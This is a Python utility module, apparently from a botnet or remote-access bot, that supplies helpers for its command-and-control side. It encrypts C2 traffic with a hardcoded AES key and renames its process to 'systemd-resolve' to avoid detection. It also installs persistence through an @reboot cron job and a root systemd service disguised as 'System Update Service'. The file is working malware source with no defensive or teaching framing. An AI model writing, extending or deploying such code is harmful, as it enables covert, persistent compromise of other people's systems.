# bot/utils.py

import os
import sys
import platform
import base64
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
# This key MUST be identical in the C2 server and the bot.
# It MUST be 16, 24, or 32 bytes long.
AES_KEY = b'YannaIsTheBest#1YannaIsTheBest#1'
BLOCK_SIZE = 16
PROCESS_NAME = "systemd-resolve" # A common Linux process name to hide as

# --- Encryption ---
def encrypt(data):
    """Encrypts data using AES-256 CBC for secure C2 communication."""
    try:
        iv = os.urandom(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), BLOCK_SIZE))
        return base64.b64encode(iv + encrypted_data).decode('utf-8')
    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        return None

def decrypt(encrypted_data):
    """Decrypts AES-256 CBC encrypted data from the C2."""
    try:
        decoded_data = base64.b64decode(encrypted_data)
        iv = decoded_data[:16]
        encrypted = decoded_data[16:]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted), BLOCK_SIZE)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"[!] Decryption failed: {e}")
        return None

# --- Evasion & Persistence ---
def spoof_process_name():
    """Changes the process name to evade simple detection."""
    try:
        # setproctitle is a more reliable way to do this if available
        from setproctitle import setproctitle
        setproctitle(PROCESS_NAME)
        print(f"[*] Process name spoofed to '{PROCESS_NAME}'")
    except ImportError:
        # A fallback for systems without setproctitle
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            buff = ctypes.create_string_buffer(len(PROCESS_NAME) + 1)
            buff.value = PROCESS_NAME.encode('utf-8')
            libc.prctl(15, ctypes.byref(buff), 0, 0, 0)
            print(f"[*] Process name spoofed to '{PROCESS_NAME}' (fallback method)")
        except Exception:
            print("[!] Could not spoof process name. Libraries not available.")

def establish_persistence():
    """Establishes persistence on the system to survive reboots."""
    if platform.system() != "Linux":
        print("[!] Persistence module only supports Linux.")
        return

    # Get the full path of the current script
    script_path = os.path.realpath(sys.argv[0])
    
    # 1. Cron Job Persistence
    try:
        # Using a pipe to add the cron job without leaving a trace in bash history
        cron_job = f"@reboot python3 {script_path} &"
        # Check if the job already exists
        result = subprocess.run('crontab -l', shell=True, capture_output=True, text=True)
        if script_path not in result.stdout:
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -', shell=True, check=True)
            print("[*] Persistence established via cron job.")
    except Exception as e:
        print(f"[!] Failed to add cron job: {e}")

    # 2. Systemd Service Persistence (more robust)
    try:
        service_name = "system-update.service"
        service_path = f"/etc/systemd/system/{service_name}"

        if os.path.exists(service_path):
            return # Already persistent

        service_content = f"""
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
        # We need root privileges to write this file
        if os.geteuid() == 0:
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", service_name], check=True)
            subprocess.run(["systemctl", "start", service_name], check=True)
            print(f"[*] Persistence established via systemd service: {service_name}")
        else:
            print("[!] Systemd persistence requires root privileges.")
            
    except Exception as e:
        print(f"[!] Failed to create systemd service: {e}")
